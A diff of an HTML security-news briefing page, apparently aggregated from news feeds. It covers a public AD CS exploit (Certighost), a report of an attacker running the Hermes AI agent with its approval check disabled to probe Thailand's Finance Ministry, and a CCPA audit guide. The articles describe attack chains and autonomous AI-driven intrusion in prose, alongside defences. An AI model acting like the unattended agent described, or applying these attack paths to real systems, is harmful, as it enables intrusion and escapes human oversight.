@@ -59,12 +59,296 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-07-24</h1>
+        <h1>Security Briefing // 2026-07-25</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Email threat landscape: Q2 2026 trends and insights</button></li><li><button onclick="show('art-1')">Chaos Ransomware Uses msaRAT to Route C2 Traffic Through Headless Chrome and Edge</button></li><li><button onclick="show('art-2')">New RefluXFS Linux flaw lets attackers gain root privileges</button></li><li><button onclick="show('art-3')">New msaRAT malware uses Chrome, Edge browsers to route C2 traffic</button></li><li><button onclick="show('art-4')">Nine-Year-Old RefluXFS Linux Flaw Gives Local Users Root on Default RHEL Installs</button></li><li><button onclick="show('art-5')">CCPA Update: Who’s In Scope (Part 1)</button></li><li><button onclick="show('art-6')">LG to Ban Residential Proxies from Smart TV Apps</button></li><li><button onclick="show('art-7')">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Hermes AI agent used to automate attack on Thai Finance Ministry</button></li><li><button onclick="show('art-1')">Hackers hijack hotel Wi-Fi DNS to steal Microsoft 365 accounts</button></li><li><button onclick="show('art-2')">Certighost Exploit Lets Low-Privileged Active Directory Users Impersonate a Domain Controller</button></li><li><button onclick="show('art-3')">Updated Cyber Threat Actor Naming System</button></li><li><button onclick="show('art-4')">Hacker Runs Hermes AI Agent Unattended for Post-Exploitation at Thai Finance Ministry</button></li><li><button onclick="show('art-5')">CCPA Update: Cybersecurity Requirements (Part 2)</button></li><li><button onclick="show('art-6')">Email threat landscape: Q2 2026 trends and insights</button></li><li><button onclick="show('art-7')">LG to Ban Residential Proxies from Smart TV Apps</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">Updates to the MSSQLHound OpenGraph Collector for BloodHound</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">Hermes AI agent used to automate attack on Thai Finance Ministry</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/hermes-ai-agent-used-to-automate-attack-on-thai-finance-ministry/" target="_blank">Original Link</a></p>
+            <div class="content-text">A threat actor used the open-source Hermes AI agent in unattended "YOLO" mode to automate post-exploitation activity during an alleged breach of Thailand's Ministry of Finance. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-1" class="article-body">
+            <h2 class="article-title">Hackers hijack hotel Wi-Fi DNS to steal Microsoft 365 accounts</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/hackers-hijack-hotel-wi-fi-dns-to-steal-microsoft-365-accounts/" target="_blank">Original Link</a></p>
+            <div class="content-text">Hackers are changing the DNS settings on Wi-Fi devices at hotels and conference centers to redirect users to fake Microsoft 365 login pages. [...]
+
+[Full content could not be extracted. Visit source for details.]</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-2" class="article-body">
+            <h2 class="article-title">Certighost Exploit Lets Low-Privileged Active Directory Users Impersonate a Domain Controller</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/certighost-exploit-lets-low-privileged.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Researchers H0j3n and Aniq Fakhrul published a working exploit on July 24 that lets a low-privileged Active Directory user obtain a certificate for a Domain Controller and authenticate as that machine.
+They codenamed the flaw Certighost. Because Domain Controller accounts carry directory replication rights, the resulting Kerberos credential can retrieve the krbtgt
+secret through DCSync
+.
+Microsoft patched the Active Directory Certificate Services (AD CS) issue ten days earlier as CVE-2026-54121
+. Microsoft classed the flaw as improper authorization and assigned it a CVSS score of 8.8.
+Exploitation requires network access and a domain account, but no administrator rights or user interaction. In the researchers' test, a normal Domain Users
+account could create a computer account under the default ms-DS-MachineAccountQuota
+value of 10
+or reuse one it already controlled.
+The chain also required an Enterprise CA that followed the vulnerable chain path, enrollment through the default Machine template, and network reachability from the CA to the attacker's SMB and LDAP listeners.
+Organizations running an Enterprise CA should install Microsoft's July 14 updates on AD CS hosts. As of July 24, no primary source reviewed by The Hacker News reported exploitation in the wild, but the full proof-of-concept was public. That absence of reporting does not prove that exploitation has not occurred.
+The researchers also documented a lab-tested way to disable the chase fallback when immediate patching is not possible, although it can break legitimate enrollment flows.
+The bug sits in an [AD CS enrollment fallback](https://thehackernews.com/2024/08/breaking-down-ad-cs-vulnerabilities.html) known as a chase. When a certification authority (CA) cannot obtain an end entity's information, the [Windows enrollment protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/f4eb50d5-62f6-470b-8846-9489af9dea62) lets a request provide cdc
+, the Active Directory server to contact, and rmd
+, the machine object to resolve.
+The researchers [found](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26) that the CA followed the requester-supplied cdc
+host over Server Message Block (SMB) and Lightweight Directory Access Protocol (LDAP) without first proving it was a real Domain Controller.
+An attacker could run rogue Local Security Authority (LSA) and LDAP services, relay the CA's authentication challenge to the real Domain Controller over Netlogon
+, and return the target Domain Controller's objectSid
+and dNSHostName
+. A controlled machine account supplied the valid domain identity needed for the CA to continue. The CA authenticated that account, then signed the target Domain Controller's identity into the certificate.
+The [public exploit](https://github.com/aniqfakhrul/CVE-2026-54121) automates the chain. It creates a computer account or reuses one specified with --computer-name
+. The tool starts listeners on ports 445
+and 389
+and relays the CA's challenge to the real Domain Controller over Netlogon
+. It then submits the cdc
+and rmd
+attributes and writes a PFX
+file and Kerberos credential cache.
+The exploit uses Public Key Cryptography for Initial Authentication in Kerberos (PKINIT) to authenticate as the target Domain Controller. The resulting credential can request account secrets through [ DCSync](https://thehackernews.com/2026/02/solarwinds-web-help-desk-exploited-for.html), including
+krbtgt
+.The researchers' binary analysis found that Microsoft's [July update](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-54121) adds CRequestInstance::_ValidateChaseTargetIsDC
+to certpdef.dll
+before the CA follows a chase. The validation rejects IP literals, overlong names, and LDAP metacharacters. It also requires exactly one matching Active Directory computer object whose DNS name matches the target and whose userAccountControl
+includes SERVER_TRUST_ACCOUNT
+(8192
+). A later SID
+comparison blocks object substitution.
+The public exploit was tested in a Windows Server 2016-or-later forest with an Enterprise CA, the default Machine certificate template, and the default machine-account quota. The [NVD record](https://nvd.nist.gov/vuln/detail/CVE-2026-54121) separately lists Windows Server 2012 through Windows Server 2025, including listed Server Core editions, as affected. It also lists Windows 10 versions 1607 and 1809. The flaw was absent from [CISA's Known Exploited Vulnerabilities catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) on July 24.
+The researchers reported the flaw to Microsoft on May 14. Microsoft confirmed it on May 22 and patched it on July 14. The researchers publicly disclosed it on July 24. Administrators who cannot patch immediately can clear the chase flag and restart Certificate Services:
+certutil -setreg policy\EditFlags -EDITF_ENABLECHASECLIENTDC
+Restart-Service CertSvc -Force
+The researchers tested that mitigation only in a controlled lab. They recommend staging it first and treating the July update as the permanent fix.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-3" class="article-body">
+            <h2 class="article-title">Updated Cyber Threat Actor Naming System</h2>
+            <p class="source-link">Source: Threat Intelligence | <a href="https://cloud.google.com/blog/topics/threat-intelligence/updated-cyber-threat-actor-naming-system/" target="_blank">Original Link</a></p>
+            <div class="content-text">Updated Cyber Threat Actor Naming System
+Google Threat Intelligence Group
+Google Threat Intelligence
+Visibility and context on the threats that matter most.
+[Contact Us & Get a Demo](https://cloud.google.com/security/resources/google-threat-intelligence-demo?utm_source=cgc-blog&utm_medium=blog&utm_campaign=FY25-Q2-global-GCP30649-website-su-dgcsm-GTI-interest)
+Introduction
+Today, Google Threat Intelligence Group (GTIG) will begin rolling out a unified naming schema for tracking threat actors. This new naming taxonomy represents an effort to standardize tracking across platforms and public reporting.
+Why are we Adopting a Different Naming System?
+Historically, Mandiant and Google’s Threat Analysis Group (TAG) maintained distinct tracking systems, relying on parallel naming schemas that grew independently over time. The creation of GTIG has necessitated a new, fused tracking system, and a new naming system. Thinking to the future, GTIG’s new system will rely on cryptonyms. Relying on sequential numbers or disparate identifiers (e.g. APT1) fails to provide defenders the critical context needed to operate quickly. Threat tracking shouldn’t be an exercise in memorization, but rather one of intuition. The new naming convention aligns with industry standard threat actor naming systems.
+Our New Schema
+Our new schema utilizes a cryptonym-based approach, employing memorable two-word combinations for each distinct threat actor:
+-
+The first word is a unique and memorable term chosen to represent the specific actor, particularly names that may have been used in prior public reporting. If no previously used term exists, this word is randomly generated to remove bias, then vetted by our analysts.
+-
+The second word categorizes threat clusters by motivation, attribution, or activity type based on which category we consider to be most important for defense and response strategies.
+The table below provides a sample of how threat actor categories will map to the second word in each cryptonym:
+Table 1: Examples of Google’s new threat actor naming system categories
+We know there are many threat actor tracking schemas in the industry, so we are intentionally seeking to keep this system as simple as possible to streamline operations and facilitate mapping to other naming taxonomies. However, a significant caveat remains: because no two organizations have the exact same visibility into the threat landscape, direct, apples-to-apples comparisons between threat actors are rarely possible. Transitioning to a convention that is simpler to follow and remember is a practical step toward managing a highly intricate tracking problem.
+A Work in Progress
+We have initially prioritized renaming several dozen of the most active groups, and will continue this process on a rolling basis. Previous names will remain indexed and searchable in the Google Threat Intelligence (GTI) platform, with MITRE ATT&CK mappings and other vendor aliases preserved, see Figure 1.
+Figure 1: Threat actor name appearance in GTI platform on initial rollout
+We will continue to use UNC, or “uncategorized” designations for threat clusters that are still in the early stages of investigation, as described [here](https://cloud.google.com/blog/topics/threat-intelligence/how-mandiant-tracks-uncategorized-threat-actors).</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-4" class="article-body">
+            <h2 class="article-title">Hacker Runs Hermes AI Agent Unattended for Post-Exploitation at Thai Finance Ministry</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/07/hacker-runs-hermes-ai-agent-unattended.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Someone installed a popular AI assistant on a rented server, switched off the setting that makes it ask permission before running risky commands, and pointed it at Thailand's Ministry of Finance, which runs the country's treasury and tax collection.
+The agent then worked through the ministry's network on its own, checking hosts for ways to gain root access, hunting through file systems, and crawling a folder of staff personnel records going back to 2012.
+The operator left the agent's own logs sitting on a web server with directory listing switched on, where threat intelligence firm Hunt.io and researcher Bob Diachenko found them, along with 585 files and 470 MB of attack tooling.
+The tool is [Hermes](https://github.com/NousResearch/hermes-agent), an open-source assistant from Nous Research that people install to manage their mail, run chores, and take instructions over Telegram or Slack. It is not a hacking tool, and nothing here is a flaw in it.
+The mode the operator used, called YOLO, is a documented feature with its own command-line flag. That is what separates this case from the AI-assisted attacks reported so far.
+When [Anthropic disclosed](https://www.anthropic.com/news/disrupting-AI-espionage) a Chinese group using Claude Code for espionage last November, the attackers had to [trick the model into cooperating](https://thehackernews.com/2025/11/chinese-hackers-use-anthropics-ai-to.html), and Anthropic banned their accounts once it noticed. Hermes runs on the operator's own machine. No vendor was watching, and there was no account to ban.
+The operator was already inside before the agent started. Hunt.io recovered a hidden web shell planted on a ministry web server, scripts written against named internal Hadoop systems, and stolen mailbox passwords hardcoded into a mail-testing script.
+Nothing in the recovered files shows data leaving the network, and how the operator first got in is unknown. Thailand's national CERT and cybersecurity agency were notified on July 15; neither had published anything when The Hacker News checked on July 24.
+For everyone else, the useful detail is what the operator's scripts were built to exploit: a Hadoop database service that ships accepting any password by default.
+The human did the parts that require knowing the target. [Hunt.io's writeup](https://hunt.io/blog/thailand-ministry-finance-targeted-with-hermes-ai-agent) shows a password list built from the ministry's own department abbreviations rather than a dictionary, and shellcode carrying hardcoded paths into the ministry intranet.
+The agent did the repetitive part: run a scan, read the output, decide what to check next, run another. Nothing in the recovered material shows it finding a new vulnerability or choosing the target.
+None of the commands were exotic. [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), a standard script that hunts for privilege escalation paths on Linux. A search for files carrying elevated permissions. A directory crawl. A person would type the same things. What changed is that nobody had to approve each one.
+Hermes offers that setting three ways: a --yolo flag at launch, a /yolo command mid-session, or a HERMES_YOLO_MODE=1 environment variable. The project's [configuration guide](https://hermes-agent.nousresearch.com/docs/user-guide/configuration) says to "only use this in trusted, sandboxed environments."
+One layer survives it: a [hardline blocklist](https://hermes-agent.nousresearch.com/docs/user-guide/security) that still refuses commands which would wipe the machine the agent is running on. What the operator switched off was the human check, not every safeguard.
+What the agent did
+Five files named call_00_*.txt hold the agent's turns: kernel vulnerability scanning against a ministry host, a second LinPEAS run, a sweep for elevated-permission binaries, a filesystem listing, and a recursive crawl of the web root belonging to the Office of the Permanent Secretary.
+That folder held Office documents, performance evaluations, and personnel records dating to 2012. The logs show the agent reading the directory. None of them show the files leaving it.
+The scan script it was handed was not stock. A customized linpeas.sh checked for four 2026 Linux kernel flaws across three families: Copy Fail (CVE-2026-31431), [Dirty Frag](https://thehackernews.com/2026/05/linux-kernel-dirty-frag-lpe-exploit.html) (CVE-2026-43284 and CVE-2026-43500), and [DirtyClone](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/) (CVE-2026-43503).
+Each hands a local user root where its prerequisites hold, which for Dirty Frag and DirtyClone means CAP_NET_ADMIN. All were weeks old when the operator staged them, and nothing recovered names a ministry kernel version or shows that any of the four ran.
+The operator's own SSH session into the staging server came from 103.97.0[.]57 in Hong Kong. The agent's web interface password contains the Chinese word Leishen, thunder god, and a key for FOFA, a Chinese asset-search service, sits alongside it.
+The same server previously hosted a [ShadowPad](https://thehackernews.com/2022/02/researchers-link-shadowpad-malware.html) controller and now runs a [VShell](https://thehackernews.com/2025/04/chinese-hackers-target-linux-systems.html) command-and-control listener. Hunt.io assesses with low-to-medium confidence that the operator is Chinese-speaking or fluent in the language, and names no group. The firm and Diachenko remain the only public source for the ministry-specific findings.
+The route into Hadoop
+Most of the custom code went on the ministry's Hadoop cluster, where it stores and queries large volumes of data. A script called hive_rce_py2.py connects to HiveServer2, the SQL front end to that cluster, on an internal machine at port 10000, and sends a password.
+[Apache's own documentation](https://hive.apache.org/docs/latest/admin/setting-up-hiveserver2/) says the default authentication mode is NONE, which accepts whatever password it is given without checking it.
+Once connected, the script installs a malicious Java add-on called HiveCmd.jar as a user-defined function, which lets it run operating-system commands through ordinary database queries and read the results back. [Cloudera warns](https://docs.cloudera.com/cdp-private-cloud-base/7.3.1/securing-hive/topics/hive-ranger-udf-security.html) that anyone able to install such a function can run arbitrary code as the Hive service account and reach sensitive data.
+Also staged on the server: a previously undocumented Go implant the operator calls Hades, built for both Windows and Linux in 62 copies. Hunt.io analyzed one of each and found the same codebase; the other 60 were not examined individually.
+Their hardcoded addresses tie the staging server to a second Hong Kong host, though no recovered artifact shows Hades reaching a ministry machine. Separate scripts tested default credentials against an internal GlassFish console, with neither deployment confirmed, alongside exploit code for three older flaws in [polkit](https://thehackernews.com/2022/01/12-year-old-polkit-flaw-lets.html), sudo, and IIS 6.0.
+What to do
+- Check whether HiveServer2 is running with authentication set to NONE, and restrict who can install user-defined functions. That default is what the operator's script was written to rely on.
+- Alert when a web server process opens a connection to internal Hadoop ports such as 10000 or 50070. A web server reaching a Hadoop node is worth a look on its own.
+- Search web roots recursively for PHP files with leading-dot names that imitate system caches. This one sat at /storage/Counter/nine/.journald-cache.php and does not appear in a normal directory listing.
+- Patch kernels against all four 2026 flaws above, plus sudo to 1.9.5p2 or later, polkit for CVE-2021-4034, and any remaining IIS 6.0 WebDAV.
+The agent leaves its own trail. Hermes's web panel returns a HermesWebUI server header, and a search on that string returned roughly 5,900 scan events over a month, as of Hunt.io's July 23 report, counting sightings rather than distinct machines.
+The better hook is where the agent writes its results: a consistent /hermes-results/ folder with predictable filenames, which turned up 575 hits in Hunt.io's index of exposed directories the same day, each one a host and filename pair. No safety control exposed this operator. A directory listing did.
+The endpoint sees the same shell commands and the same tools either way. Nothing in an ordinary command line announces that nobody is at the keyboard.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <br>
+            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
+            <hr class="separator">
+        </div>
+        <div id="art-5" class="article-body">
+            <h2 class="article-title">CCPA Update: Cybersecurity Requirements (Part 2)</h2>
+            <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/ccpa-update-cybersecurity-requirements-part-2" target="_blank">Original Link</a></p>
+            <div class="content-text">CCPA Update: Cybersecurity Requirements (Part 2)
+Table of contents
+The state of California has updated the [California Consumer Privacy Act](https://cppa.ca.gov/pdf/20260101_ccpa_statute.pdf) (CCPA) and its [supporting regulations](https://cppa.ca.gov/regulations/pdf/ccpa_statute_eff_20260101.pdf) yet again, and this time it has a cybersecurity audit requirement. The [California Privacy Protection Agency](https://cppa.ca.gov/) (CPPA) oversees compliance with these regulations. This post will cover what organizations need to know about their cybersecurity obligations, including who they apply to, the penalties for non-compliance, when they must be done, and what the requirements are.
+This post only covers the cybersecurity requirements of CCPA. The privacy requirements are a separate and much less technical topic. Businesses must keep in mind that cybersecurity and privacy are two (2) different things, and they must still comply with the privacy portions of CCPA (including the risk assessment) even if they pass the cybersecurity audit.
+TrustedSec has years of experience helping organizations implement and audit both cybersecurity and privacy requirements. Please [get in touch with us](https://trustedsec.com/contact) for any questions on the applicability, scope, or requirements of CCPA or other compliance frameworks.
+Overview
+Each of the topics in this section are covered in much more detail throughout the other sections of this post. Click on the topic headers or use the navigation bar to jump to the relevant detailed section.
+[Applicability](#Applicability)
+The CCPA cybersecurity audit requirement applies to businesses that do business in the State of California and collect consumers’ personal information if they meet certain revenue and/or personal information processing thresholds. The cybersecurity audit requirements are narrower than the CCPA requirements, so not all business subject to CCPA will need to complete a cybersecurity audit.
+[Enforcement](#Enforcement)
+Violations of the CCPA cybersecurity audit requirement are enforced via the same mechanism as the rest of CCPA, via a system of administrative fines and civil penalties for non-compliance as well as additional per-consumer, per-incident damages for breaches imposed by CPPA or via consumer individual or class action.
+[Rollout Timeline](#Timeline)
+The cybersecurity audit requirement has a phased rollout based on decreasing revenue thresholds. The first wave will be required to meet the cybersecurity requirements throughout calendar year 2027 and complete an audit in early 2028. All organizations that meet the cybersecurity audit applicability criteria will be required to meet the cybersecurity requirements in 2031 and complete an audit in early 2032.
+[Certification](#Certification)
+Each business to which the cybersecurity audit requirement applies must submit an annual certification that the audit was completed and that the business meets the cybersecurity requirements via the CPPA website by April 01 following the calendar year covered by the audit. This certification must be made by executive management under the penalty of perjury.
+[Audit Performance](#Performance)
+CCPA has strict requirements for auditor skills and independence. While CCPA allows for internal audits, businesses will need to determine if they have any personnel with the appropriate audit skills, cybersecurity skills, and independence to perform the audit. Businesses must also ensure that external auditors meet these requirements.
+[Audit Scope](#Scope)
+The cybersecurity requirements and audit effectively apply to any devices that handle personal information, including network infrastructure, security infrastructure, cloud services, and other service providers that can impact the security of personal information.
+[Cybersecurity Requirements](#Requirements)
+There are 18 top-level requirements, some of which are supported by subrequirements. The requirements are somewhat vague, but CCPA allows leeway for businesses to implement the requirements in a manner that is appropriate to the business’s size and complexity and the nature and scope of its processing activities.
+Applicability
+Businesses are only required to comply with the CCPA cybersecurity audit requirement if CCPA itself is already applicable to them. See our other post CCPA Update: Who’s In Scope (coming soon) for more information on CCPA applicability.
+Businesses that are required to comply with CCPA are only required to meet the CCPA cybersecurity audit requirement if they meet either of the following criteria:
+- Derive 50% or more of annual revenues from selling or sharing consumers' personal information
+- Meet the annual gross revenue threshold for CCPA applicability ($26,625,000 as of January 1, 2025) and meet either of the following criteria:
+- Processed the personal information of 250,000 or more consumers or households in the preceding calendar year
+- Processed the sensitive personal information (more on that definition below) of 50,000 or more consumers in the preceding calendar year
+The gross revenue threshold shown above is adjusted for inflation every two (2) years. The CPPA publishes [the current threshold](https://cppa.ca.gov/regulations/cpi_adjustment.html).
+Details on what qualifies as Personal Information and Sensitive Personal Information is covered in our previous post CCPA Update: Who’s In Scope (coming soon).
+Enforcement
+From an enforcement perspective, the cybersecurity audit requirement is the same as any other requirement within CCPA and is subject to the same penalties as any other violation. Details on CCPA enforcement mechanisms and fines are covered in our previous post CCPA Update: Who’s In Scope.
+Note that encryption of personal information is one of the cybersecurity requirements and that additional penalties apply following breaches of nonencrypted and nonredacted personal information.
+Rollout Timeline
+CCPA regulations define a phased rollout for the cybersecurity audit at [11 CCR §7121](https://cppa.ca.gov/regulations/pdf/ccpa_statute_eff_20260101.pdf) based on the business’ gross annual revenue.
+Any business that exceeds the gross annual revenue threshold in the gross annual revenue year indicated below must comply with the cybersecurity requirements during the indicated audit coverage period and submit an audit report to the state covering that period by the submission deadline.
+Gross Annual Revenue Year | Gross Annual Revenue | Audit Coverage Period | Audit Report Submission Deadline |
+|---|---|---|---|
+2026 | Greater than $100,000,000 | January 01, 2027 - January 01, 2028 | April 01, 2028 |
+2027 | Greater than $50,000,000 | January 01, 2028 - January 01, 2029 | April 01, 2029 |
+2028 | Less than $50,000,000 | January 01, 2029 - January 01, 2030 | April 01, 2030 |
+After April 01, 2030, the phased rollout is complete, and the annual revenue thresholds shown in the table above become irrelevant. Each business must check whether it met the cybersecurity audit applicability criteria during the calendar year that just ended on January 01 of each year. Businesses that met the applicability criteria in the previous calendar year must comply with the cybersecurity requirements during the entire calendar year that just began and will need to conduct a cybersecurity audit covering that calendar year by April 01 of the following year.
+Note that the audit will cover the entire calendar year prior to the audit reporting deadline, so all relevant security requirements must be in place by the start of a business’s audit coverage period on January 01 of the year the audit covers, not by the start of the audit a few months before the audit reporting deadline. A business will fail their audit if an auditor uncovers evidence that the cybersecurity requirements were not implemented at any time during the audit coverage period.
+For example, a business that meets the CCPA cybersecurity audit applicability criteria for the first time during the calendar year 2030 (as determined on January 01, 2031) must:
+- Have the cybersecurity requirements implemented during the entirety of calendar year 2031, starting on January 01, 2031
+- Complete an audit covering calendar year 2031 during Q1 of 2032
+- Submit audit certification to CPPA by April 01, 2032
+Certification
+Businesses must submit a written certification that a cybersecurity audit was completed and meets the cybersecurity requirements defined in CCPA by April 01 following any year that the business is required to meet the cybersecurity requirements.
+This certification must be completed by a member of the business’s executive management team who meets all of the following criteria:
+- Is directly responsible for the business’s cybersecurity-audit compliance
+- Has sufficient knowledge of the business’s cybersecurity audit to provide accurate information
+- Has the authority to submit the business’s certification to the Agency
+The certification must be submitted via the [CPPA website](https://cppa.ca.gov/). As of the time of publication, the CPPA website does not provide instructions for submitting the certification, which is not surprising because the first certification submissions are not required until April 01, 2028. The author suspects CPPA will create a form that captures all of the required information described below, but businesses may want to be prepared to create their own certification letter in case CPPA uses a more freeform submission process. As per CCPA, the certification must include all of the following:
+- The business’s name and point of contact for the business, including the contact’s name, phone number, and email address
+- A statement that the business has completed the cybersecurity audit
+- The time period covered by the cybersecurity audit, by month and year
+- An electronically signed attestation to the following statement: “I attest that I meet the requirements of California Code of Regulations, Title 11, section 7124, subsection (c), to submit this certification. Under penalty of perjury under the laws of the state of California, I hereby declare that the information contained within and submitted with this certification is true and correct and that the business has not made any attempt to influence the auditor’s decisions or assessments regarding the cybersecurity audit.”
+- The name and business title of the person submitting the certification, and the date of the certification
+Audit Performance
+CCPA defines a set of requirements for how the cybersecurity audits are to be performed. These key requirements include:
+- Performed by an independent professional auditor
+- Use procedures and standards accepted in the profession of auditing
+- Auditor must have knowledge of cybersecurity and how to audit a cybersecurity program
+While CCPA leaves the door open to internal or external audits, many smaller businesses that do not have an internal audit department will struggle to find in-house personnel that meet all of the criteria above in order to perform an internal audit and will likely require an external audit. Businesses that choose to use an internal auditor will need to take extra care to demonstrate that the auditor is independent, professional, and has the appropriate cybersecurity knowledge. Businesses should also keep these criteria in mind when choosing an external auditor.
+Professional Auditing
+Auditing requires knowledge of specific audit techniques. Most cybersecurity personnel, even those performing technical assessments like vulnerability scans and penetration tests, do not have these skills.
+Businesses will need to demonstrate that the auditor, whether internal or external, is familiar with and follows audit procedures and standards such as those published by [AICPA](https://www.aicpa-cima.com/), [ISACA](https://www.isaca.org/), [ISO](https://www.iso.org/), or [PCAOB](https://pcaobus.org/).
+Cybersecurity Knowledge
+Audits require knowledge of the subject being audited, as well as standard audit procedures, and cybersecurity is no different. Many internal audit teams and external audit providers may be more familiar with financial or other non-technical controls than they are with cybersecurity controls. This can lead to audit reports that miss important findings or include false positive findings due to misunderstandings about the requirements and how they are typically implemented.
+Businesses must take care to determine whether their auditor, internal or external, has the necessary cybersecurity knowledge to perform this type of assessment to ensure accurate audit results and to comply with the CCPA requirement.
+Independence
+An auditor, whether internal or external, must be free to make decisions and assessments without influence by the business.
+CCPA goes a step further for internal audits and requires the lead auditor to report directly to a member of the business’s executive management team who does not have direct responsibility for the cybersecurity program. Performance evaluations and compensation of the internal auditor also must be determined by a member of the business’s executive management team who does not have direct responsibility for the cybersecurity program.
+Many businesses have a bad habit of asking their cybersecurity personnel to audit their own cybersecurity program. While this seemingly solves the problem of cybersecurity knowledge, it violates the principle of independence: The auditor must not participate in activities that the auditor may assess during the audit. Examples of activities that an auditor cannot participate in include:
+- Developing procedures
+- Preparing the business documents
+- Making cybersecurity program recommendations
+- Implementing or maintaining the cybersecurity program
+The independence problem is not exclusive to internal auditors. Businesses working towards compliance may seek outside help to design and implement the cybersecurity program and often attempt to find a single consulting firm that can help both implement and audit the program. The same principle applies: The external auditor cannot participate in activities that they will later audit. Businesses that seek to have their cybersecurity compliance program designed, implemented, and audited by the same consulting firm must verify that the consulting firm will not assign audit tasks to the same personnel that participated in design or implementation. Businesses must also verify that the program has strong internal controls to prevent the audit from being influenced by the fact that the consulting firm helped with the design or implementation of the program being audited.
+Cooperation
+As an auditor of nearly 20 years, there is nothing more frustrating than a client that does not provide the information necessary to conduct an audit—or worse, attempts to conceal information that would result in a failing audit.
+CCPA requires businesses provide the auditor with all requested information relevant to the cybersecurity audit. Businesses must also make good-faith efforts to disclose all relevant facts and are prohibited from misrepresenting relevant facts. Businesses that do not provide the necessary information may find themselves failing an audit because the auditor has lost faith in the audit process, regardless of the actual compliance status.
+Evidence
+CCPA requires auditors to rely on evidence, such as documentation reviews and testing of systems. This may also include interviews with personnel performing work covered by the requirements. Auditors are specifically prohibited from relying exclusively on assertions and attestations by business management. “It works this way because I said so” is not good enough for CCPA.
+Businesses should prepare for an audit by:
+- Understanding what systems, personnel, and locations are in or out of scope (and why)
+- Collecting all relevant policies and procedures
+- Collecting records that demonstrate that the required processes are being followed
+- Making sure the personnel that perform required processes will be available for interviews
+- Being prepared to provide over-the-shoulder demonstrations of required processes
+- Being prepared to retrieve artifacts from in-scope systems, e.g., configuration and log files
+- Being prepared to provide auditors with access to in-scope systems
+Report Handling
+The cybersecurity audit report must be provided to a member of the business’s executive management team who has direct responsibility for the cybersecurity program. This may come as a surprise to many businesses that tend to delegate such tasks to the cybersecurity team.
+Both the business and the auditor must maintain documents relevant to the audit for a minimum of five (5) years after audit completion. While some businesses may be uncomfortable with an auditor maintaining copies of security-related information, this is a requirement. Businesses should take their own steps to assess the retention procedures and protections implemented by external auditors.
+Audit Scope
+The official scope of the cybersecurity audit is to “assess how the business’s cybersecurity program: protects personal information from unauthorized access, destruction, use, modification, or disclosure; and protects against unauthorized activity resulting in the loss of availability of personal information.”
+For practical purposes, this means that any device that handles personal information is in scope for the cybersecurity requirements and audit.
+Many organizations that are new to cybersecurity requirements tend to focus only on devices that store the covered information and forget about devices that only process or transmit the information—e.g., workstations used to interact with personal information within a cloud application that do not store personal information locally, or network switching and routing infrastructure that transmits personal information as it moves from one (1) device to another.
+Although CCPA does not explicitly state that devices that process or transmit personal information are in scope, compromise of such devices could clearly lead to unauthorized access to or affect the availability of personal data at a minimum. Applying compliance requirements to devices that only process or transmit covered information, without storage, is also a principle in other compliance frameworks that follow the flow of specific types of information (e.g., PCI DSS and CMMC).
+Businesses will also find that much of their security infrastructure will fall in scope, even though it does not directly store, process, or transmit personal information. This is because any security infrastructure used to implement the CCPA cybersecurity requirements cannot effectively protect personal information if the security infrastructure itself is not secured.
+The generally accepted practice from other cybersecurity frameworks (e.g., PCI DSS and CMMC) is that a host must be completely isolated from devices that store, process, or transmit covered information (personal information in this case) to be considered out of scope. If a host can establish a connection on any port, protocol, or service to a device that handles personal information it will generally be considered in scope, even if that connection transits a firewall. Segmentation of information systems is a CCPA cybersecurity requirement, so separating systems that have a business reason to handle personal information from systems that do not is mandatory.
+CCPA also explicitly applies to the security of cloud services used by a business to handle personal information. Similarly, businesses may outsource some security functions to service providers. Outsourcing the handling of personal information is not a magic loophole to avoid compliance requirements, and each cybersecurity requirement must be met by either the business, the service provider, or a combination of both.
+Businesses should work with cloud and other service providers that handle or can impact the security of personal information to determine how cybersecurity responsibilities will be assigned between the parties and how the service provider meets the necessary requirements. Ideally, this should be handled as part of the contract process defined in the privacy portion of CCPA at [11 CCR §§7050-7053](https://cppa.ca.gov/regulations/pdf/ccpa_statute_eff_20260101.pdf).
